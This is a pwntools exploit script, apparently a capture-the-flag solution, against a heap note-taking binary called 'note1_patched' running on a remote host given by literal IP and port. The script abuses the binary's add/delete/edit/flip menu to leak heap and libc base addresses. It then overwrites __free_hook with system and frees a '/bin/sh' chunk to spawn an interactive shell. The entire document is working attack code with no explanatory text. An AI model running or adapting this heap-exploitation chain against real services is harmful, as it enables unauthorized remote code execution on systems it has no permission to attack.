#!/usr/bin/env python3
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF("./note1_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 0
if local:
    p = process([elf.path])
else:
    p = remote('124.16.75.162', 31052)

def add(sz, data):
    sla('choice: ', '1')
    sl(str(sz))
    s(data)

def delete():
    sla('choice: ', '2')

def edit(data):
    sla('choice: ', '3')
    s(data)

def show():
    sla('choice: ', '4')

def flip():
    sla('choice: ', '5')

# idx : 0x2c0 ~ 0x12b0
# leak heap
flip()
for i in range(0x82):
    add(0x80, 'A')
flip()
edit(8 * 'A')
show()
ru(8 * 'A')
heap_base = uu64(r(6).ljust(8, '\x00')) - 0x5360
info('heap_base = ' + hex(heap_base))

# leak libc
flip()
add(0x420, 'B')
add(0x80, 'B') # padding
delete()
delete()
flip()
edit(8 * 'B' + up64(heap_base + 0x53f0))
flip()
show()
libc_base = uu64(r(6).ljust(8, '\x00')) - 0x1ebbe0
info('libc_base = ' + hex(libc_base))

# get shell
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']
flip()
edit(up64(8) + up64(free_hook))
flip()
edit(up64(system)) # forge __free_hook
flip()
add(0x20, '/bin/sh\x00')
delete()

#gdb.attach(p)

p.interactive()

